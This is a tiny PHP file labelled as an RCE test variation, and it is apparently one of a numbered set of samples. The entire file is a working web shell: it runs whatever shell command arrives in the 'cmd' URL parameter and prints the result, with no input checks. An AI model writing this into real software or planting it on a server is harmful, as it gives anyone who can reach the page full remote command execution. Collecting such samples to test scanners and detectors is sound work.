<?php
// RCE test variation #396
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>